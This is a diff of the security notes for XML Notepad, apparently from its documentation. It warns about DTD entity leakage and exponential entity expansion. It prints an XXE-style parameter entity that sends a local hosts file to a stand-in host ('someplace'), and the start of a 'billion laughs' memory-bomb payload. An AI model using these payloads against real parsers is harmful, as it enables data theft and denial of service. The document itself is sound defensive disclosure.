@@ -13,8 +13,7 @@ and attribute names and values.
 
 ## DTD Entity Leakage
 
-Users must be careful about which DTD's they allow XML Notepad to process.  There is a well known attack using malicious DTD's that works like this.  A safer example of this is included
-in the XML Notepad samples folder named `DtdEntityLeakage.xml`:
+Users must be careful about which DTD's they allow XML Notepad to process.  There is a well known attack using malicious DTD's that works like this:
 
 
 **Step 1** - Create `bait.xml`:
@@ -28,7 +27,7 @@ in the XML Notepad samples folder named `DtdEntityLeakage.xml`:
 
 **Step 2** - User open `bait.xml` in XML Notepad, unaware that is a malicious XML file.
 
-**Result:** XML Notepad immediately makes an outbound HTTP GET request to the listener```
+**Result:** XML Notepad immediately makes an outbound HTTP GET request to the listener
 
 **The malicious DTD contains parameter entities that read local secrets**
 and then sends those secrets to someplace as URL query parameters:
@@ -37,6 +36,8 @@ and then sends those secrets to someplace as URL query parameters:
 <!ENTITY % leak SYSTEM "http://someplace/bad.dtd&amp;hosts=%hosts;">
 <!ENTITY bad "<![CDATA[%leak;]]>">
 ```
+
+A safe example of this is included in the XML Notepad samples folder named `DtdEntityLeakage.xml`.
 
 ### Impact
 
@@ -54,7 +55,7 @@ and set `Ignore DTD=False` under Validation options.
 A malicious DTD can also contain entities that explode into gigabytes of memory by writing
 something like this:
 
-```
+```xml
 <!ENTITY e0 "This is some long text that we will replicate exponentially">
 <!ENTITY e1 "&e0;&e0;&e0;&e0;&e0;&e0;&e0;&e0;&e0;&e0;">
 <!ENTITY e2 "&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;">
